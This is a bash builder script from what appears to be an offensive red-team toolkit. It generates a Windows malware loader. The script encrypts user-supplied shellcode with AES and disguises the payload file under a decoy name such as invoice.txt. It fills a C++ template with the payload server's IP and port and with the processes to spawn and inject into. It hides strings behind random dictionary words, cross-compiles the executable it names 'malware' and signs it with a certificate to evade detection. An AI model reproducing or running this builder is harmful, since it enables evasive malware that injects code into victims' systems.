#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
___  ___         _                 _     
|  \/  |        | |               ( )    
| .  . | ___  __| |_   _ ___  __ _|/ ___ 
| |\/| |/ _ \/ _` | | | / __|/ _` | / __|
| |  | |  __/ (_| | |_| \__ \ (_| | \__ \
\_|  |_/\___|\__,_|\__,_|___/\__,_| |___/
                                         
                                         
     _____                  __           
    |  _  |                / _|          
    | | | |_   _  ___  ___| |_           
    | | | | | | |/ _ \/ _ \  _|          
    \ \/' / |_| |  __/  __/ |            
     \_/\_\\__,_|\___|\___|_|                       

 An homage to Sektor7's Perun's Fart
  credit: @SEKTOR7net @MalDevAcademy
          by assume-breach                         
EOF
echo ""
echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"What's The IP Of Your Payload Server?"${clear}
echo ""
read HOSTIP
echo ""
echo -e ${green}"Enter The Port Of Your Payload Server"${clear}
echo ""
read PORTY
echo ""
echo -e ${green}"Name Your Shellcode File. ex: invoice.txt"${clear}
echo ""
read SHELLCODEFILE
echo ""
echo -e ${green}"Name Your Malware! ex: malware.exe"${clear}
echo ""
read MALWARE
echo ""
cp template.cpp Resources/template.cpp
echo -e "${green}Enter The Service You Want To Spawn In A Suspended State${clear}"
echo ""
read SPAWN
echo ""
echo -e "${green}Enter The Service You Want To Inject Into${clear}"
echo ""
read INJ3CT
echo ""
# Use a static name for NtDe
ntde="RandomH"

# Loop through each character in the input string and construct the array declaration
output_array=""
for ((i=0; i<${#SPAWN}; i++)); do
    # Append each character to the output array
    output_array+=" '${SPAWN:$i:1}',"
done

# Add a null terminator and close the array
output_array+=" 0x0 };"

# Print the final array declaration
printf "unsigned char ${ntde}[] = {${output_array}\n" > string.txt
SPAWN=$(cat string.txt)
sed -i "s/SPAWN/$SPAWN/g" Resources/template.cpp


# Use a static name for NtDe
ntde="RandomK"

# Loop through each character in the input string and construct the array declaration
output_array=""
for ((i=0; i<${#INJ3CT}; i++)); do
    # Append each character to the output array
    output_array+=" '${INJ3CT:$i:1}',"
done

# Add a null terminator and close the array
output_array+=" 0x0 };"

# Print the final array declaration
printf "unsigned char ${ntde}[] = {${output_array}\n" > string.txt
INJ3CT=$(cat string.txt)
sed -i "s/INJ3CT/$INJ3CT/g" Resources/template.cpp

rm string.txt

echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
python3 Resources/aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"***Encryption Completed***"${clear}
echo ""
cp shell.txt shell2.txt

#Generate AES Key
keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Resources/template.cpp

#Generate AES Payload
payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
cp conv.py Resources/con.py
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Resources/con.py
sed -i "s/{/[/g" -i Resources/con.py
sed -i "s/}/]/g" -i Resources/con.py
sed -i "s/;//g" -i Resources/con.py
python3 Resources/con.py
#rm Resources/con.py
mv payload.bin $SHELLCODEFILE
sleep 2

#Replace IP, PORT and SHELLCODEFILE
sed -i "s/HOSTIP/$HOSTIP/g" Resources/template.cpp
sed -i "s/PORTY/$PORTY/g" Resources/template.cpp
sed -i "s/SHELLCODEFILE/$SHELLCODEFILE/g" Resources/template.cpp
#Replacing Values

#sed -i "s/HOSTIP/$HOSTIP/g" Resources/template.cpp
input_file="/usr/share/dict/words"
output_file="/usr/share/dict/words_no_apostrophes"
template_file="Resources/template.cpp"


# Remove apostrophes and save to the output file
sed "s/'//g" "$input_file" > "$output_file"

# Replace placeholders in the template.cpp file with different random sentences
for placeholder in Random{1..9} Random{A..Z}; do
    RandomSentence=$(grep -v "'" "$output_file" | shuf -n 20 | tr '\n' '_' | sed 's/_$//')
    sed -i "s/$placeholder/$RandomSentence/g" "$template_file"
done
echo -e ${yellow}"+++Strings Replaced By Sentences+++"${clear}
#Compile
echo ""
echo -e ${yellow}"+++Compiling Malware+++"${clear}
x86_64-w64-mingw32-g++ -o $MALWARE Resources/template.cpp -Wno-narrowing -static-libgcc -static-libstdc++ -lws2_32 -lntdll -lwininet Resources/resources.res -fpermissive -O2 -O3 -Os -D_WIN32_WINNT=0x0601 >/dev/null 2>&1
echo ""
sleep 2
rm shell*
echo -e ${yellow}"***Malware Compiled***"${clear}
echo ""
sleep 2
echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
echo ""
sleep 2
sleep 2
# Set static paths for certificate, private key, executable, and signed output
CERTIFICATE_PATH="Resources/certificate.pem"
KEY_PATH="Resources/private_key.pem"


# Check if osslsigncode is installed
if ! command -v osslsigncode &> /dev/null; then
    echo "Error: osslsigncode is not installed. Please install it first."
    exit 1
fi

# Check if the certificate and key files exist
if [ ! -f "$CERTIFICATE_PATH" ] || [ ! -f "$KEY_PATH" ]; then
    echo "Error: Certificate or private key file not found."
    exit 1
fi

# Check if the executable file exists
if [ ! -f "$MALWARE" ]; then
    echo "Error: Executable file not found."
    exit 1
fi

# Sign the executable using osslsigncode
osslsigncode sign -certs "$CERTIFICATE_PATH" -key "$KEY_PATH" -in "$MALWARE" -out "signed$MALWARE" >/dev/null 2>&1

mv signed$MALWARE $MALWARE
echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
echo ""
